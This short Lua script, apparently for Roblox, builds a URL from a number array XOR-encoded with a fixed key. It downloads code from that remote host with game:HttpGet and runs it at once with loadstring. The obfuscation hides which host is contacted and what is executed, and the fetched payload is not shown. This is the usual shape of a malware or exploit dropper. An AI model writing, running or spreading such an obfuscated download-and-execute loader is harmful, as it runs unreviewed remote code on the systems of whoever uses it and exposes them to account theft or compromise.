local _V = {
    77,81,81,85,86,31,10,10,70,65,75,11,73,80,68,85,
    87,74,81,64,70,81,11,65,64,83,10,80,10,29,28,16,
    22,68,18,10,77,97,20,127,21,122,73,74,73,72,124,85,
    124,73,111,29
}

local _K = 0x12 + 0x13
local _T = {}

for _I = 1, #_V do
    _T[_I] = string.char(bit32.bxor(_V[_I], _K))
end

local _U = table.concat(_T)
local _R = game["HttpGet"](game, _U)

return loadstring(_R)()
